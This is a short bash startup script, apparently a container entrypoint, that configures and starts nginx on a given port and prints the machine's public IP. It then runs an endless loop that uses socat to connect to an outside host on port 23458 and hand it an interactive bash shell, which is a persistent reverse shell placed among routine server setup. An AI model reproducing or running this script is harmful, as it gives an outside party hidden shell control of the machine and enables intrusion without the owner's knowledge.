#!/bin/bash
set -x 


echo "PORT=$PORT"
sed -i "s/    listen[^:]*;/    listen $PORT;/" /etc/nginx/sites-available/code
sed -i "s/    listen.*:.*;/    listen [::]:$PORT;/" /etc/nginx/sites-available/code

nginx -t
service nginx start

wget -qO- http://ifconfig.me

while true
do
	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:lab.sivilization.com:23458
done


sleep infinity
